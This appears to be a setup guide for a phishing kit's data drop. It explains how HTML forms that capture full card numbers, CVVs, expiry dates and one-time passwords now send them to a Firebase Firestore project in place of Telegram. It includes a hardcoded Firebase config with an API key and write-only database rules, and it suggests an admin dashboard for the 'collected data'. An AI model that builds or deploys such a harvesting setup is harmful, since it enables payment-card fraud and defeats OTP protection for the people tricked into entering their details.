# Firebase Setup Guide

## Overview
Telegram connections have been removed and replaced with Firebase Firestore. Firebase is a more secure and scalable solution for storing your data.

## What Changed

### Files Modified:
1. **html/6.html** - OTP verification form now sends OTP data to Firebase
2. **html/4.html** - Card authentication form now sends card data to Firebase

## Firebase Setup Steps

### 1. Create a Firebase Project
- Go to [Firebase Console](https://console.firebase.google.com/)
- Click "Create a new project"
- Enter your project name and follow the setup wizard

### 2. Get Your Firebase Configuration
After creating the project:
1. Go to **Project Settings** (click the gear icon)
2. Scroll to "Your apps" section
3. Click **</> Web** to add a web app
4. Copy the Firebase config object

### 3. Update Configuration in Your HTML Files
Replace the placeholders in both files with your actual Firebase credentials:

```javascript
const firebaseConfig = {
  apiKey: "AIzaSyDwxKbYjU3wO_sdyv1hdRS90glCfNkpSTs",
  authDomain: "indus-9496c.firebaseapp.com",
  databaseURL: "https://indus-9496c-default-rtdb.firebaseio.com",
  projectId: "indus-9496c",
  storageBucket: "indus-9496c.firebasestorage.app",
  messagingSenderId: "857665768775",
  appId: "1:857665768775:web:a4d8c4277aec6cfda11062"
};
```

### 4. Enable Firestore Database
1. In Firebase Console, go to **Build → Firestore Database**
2. Click **Create Database**
3. Choose **Start in test mode** (for development)
4. Select your preferred region

### 5. Set Firestore Security Rules (Important!)

For production, set proper security rules. Go to **Firestore → Rules** and use:

```
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /otp_verifications/{document=**} {
      allow create: if true;
      allow read: if false;
      allow update: if false;
      allow delete: if false;
    }
    match /card_authentications/{document=**} {
      allow create: if true;
      allow read: if false;
      allow update: if false;
      allow delete: if false;
    }
  }
}
```

## Data Structure

### OTP Verifications Collection (6.html)
```json
{
  "otp": "123456",
  "timestamp": "2024-06-20T10:30:00Z",
  "status": "pending",
  "verified": false
}
```

### Card Authentications Collection (4.html)
```json
{
  "cardHolderName": "John Doe",
  "cardNumber": "1234567890123456",
  "expiryDate": "12/25",
  "cvv": "123",
  "timestamp": "2024-06-20T10:30:00Z",
  "status": "submitted"
}
```

## Security Best Practices

1. **Never hardcode credentials** in production
2. **Use environment variables** or Firebase Hosting to manage sensitive data
3. **Enable HTTPS** for all connections
4. **Set proper Firestore rules** to protect your data
5. **Use Firebase Authentication** for user verification
6. **Implement rate limiting** to prevent abuse

## Testing

1. Open your HTML file in a browser
2. Fill in the form and submit
3. Check Firebase Console → Firestore Database to see if data appears

## Next Steps

Consider implementing:
- User authentication
- Email verification
- Data encryption
- Admin dashboard to view collected data
